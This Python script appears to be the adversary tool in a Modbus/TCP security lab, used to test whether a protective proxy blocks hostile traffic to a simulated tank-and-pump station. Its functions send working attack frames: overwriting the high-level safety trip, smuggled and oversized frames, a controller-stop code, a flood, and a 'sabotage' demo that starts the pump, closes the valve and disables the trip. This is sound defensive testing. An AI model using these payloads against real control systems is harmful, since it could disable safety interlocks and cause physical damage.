#!/usr/bin/env python3
"""The adversary: traffic nobody should be able to send to the station.

    python3 tools/attack.py --list
    python3 tools/attack.py write_safety_register                # at the proxy
    python3 tools/attack.py write_safety_register --port 5020    # at the controller

Each attack is a small function that opens a connection and sends bytes.
tools/gauntlet.py runs them one by one and checks what reached the station.

Adding an attack: write a function here, decorate it with @attack, then
add a test for it in tools/gauntlet.py.
"""

import argparse
import socket
import time

import modbus
from plant import (COIL_PUMP, COIL_VALVE, HR_HIGH_TRIP, IR_LEVEL,
                   STOP_CONTROLLER)

ATTACKS = {}

NEVER_TRIP = 2000     # 200.0 %: a level the tank can never reach


def attack(function):
    ATTACKS[function.__name__] = function
    return function


def send(port, *pieces, pause=0.0):
    """Send each piece in its own write. Return what came back, if anything."""
    with socket.create_connection((modbus.HOST, port), timeout=2.0) as sock:
        for i, piece in enumerate(pieces):
            if i:
                time.sleep(pause)
            sock.sendall(piece)
        try:
            return sock.recv(1024)
        except OSError:
            return b""


# --- Requests the station must never execute ---------------------------------

@attack
def write_safety_register(port):
    """A normal, well-formed write, to the one register nobody may change."""
    return send(port, modbus.frame(
        modbus.write_single_register(HR_HIGH_TRIP, NEVER_TRIP)))


@attack
def write_across_boundary(port):
    """A block write that starts on an allowed register and runs into the
    safety one."""
    values = [1000] + [0] * 9 + [NEVER_TRIP]          # registers 0 to 10
    return send(port, modbus.frame(modbus.write_multiple_registers(0, values)))


@attack
def stop_controller(port):
    """A vendor function code that halts the control program."""
    return send(port, modbus.frame(bytes([STOP_CONTROLLER, 0x00])))


@attack
def smuggled_frame(port):
    """Two messages in one write: a harmless read, and behind it a write to
    the safety register."""
    return send(port,
                modbus.frame(modbus.read_input_registers(IR_LEVEL, 1), 1)
                + modbus.frame(
                    modbus.write_single_register(HR_HIGH_TRIP, NEVER_TRIP), 2))


@attack
def oversized_read(port):
    """A read of 2000 registers. The specification allows 125. The
    controller's firmware does not check."""
    return send(port, modbus.frame(modbus.read_holding_registers(0, 2000)))


@attack
def bad_protocol_id(port):
    """A pump command whose header says it is not Modbus (protocol id is
    not 0). The controller does not look at that field."""
    return send(port, modbus.frame(
        modbus.write_single_coil(COIL_PUMP, True), protocol=0x1234))


@attack
def oversized_frame(port):
    """A message longer than any legal Modbus/TCP message (260 bytes)."""
    return send(port, modbus.frame(
        modbus.write_multiple_registers(HR_HIGH_TRIP, [NEVER_TRIP] * 140)))


@attack
def silent_connection(port, seconds=30.0):
    """Connect and say nothing. Costs the attacker one idle connection."""
    with socket.create_connection((modbus.HOST, port)):
        time.sleep(seconds)
    return b""


# --- Demonstrations: not scored by the gauntlet ------------------------------

@attack
def sabotage(port):
    """DEMO. Close the valve, start the pump, disable the trip, then freeze
    the controller. Watch the plant's terminal for the next 30 seconds."""
    for pdu in (modbus.write_single_coil(COIL_VALVE, False),
                modbus.write_single_coil(COIL_PUMP, True),
                modbus.write_single_register(HR_HIGH_TRIP, NEVER_TRIP),
                bytes([STOP_CONTROLLER, 0x00])):
        send(port, modbus.frame(pdu))
    return b""


@attack
def flood(port, count=2000):
    """DEMO. Ask for the level as fast as the connection allows, and report
    how many requests were answered."""
    answered = 0
    start = time.time()
    try:
        with modbus.Client(port) as client:
            for _ in range(count):
                client.request(modbus.read_input_registers(IR_LEVEL, 1))
                answered += 1
    except (modbus.Refused, modbus.ModbusError):
        pass
    elapsed = time.time() - start
    print(f"attack: {answered} of {count} requests answered "
          f"in {elapsed:.2f} s")
    return b""


def main():
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("name", nargs="?")
    parser.add_argument("--port", type=int, default=modbus.WARDEN_PORT)
    parser.add_argument("--list", action="store_true")
    args = parser.parse_args()

    if args.list or args.name is None:
        for name, function in ATTACKS.items():
            print(f"{name:24}{' '.join(function.__doc__.split())}")
        return

    if args.name not in ATTACKS:
        parser.error(f"unknown attack: {args.name} (try --list)")

    try:
        answer = ATTACKS[args.name](args.port)
    except OSError as error:
        print(f"attack: could not connect to port {args.port} ({error})")
        return
    print(f"attack: {args.name} sent to port {args.port}, "
          f"answer: {answer.hex(' ') if answer else 'none'}")


if __name__ == "__main__":
    main()
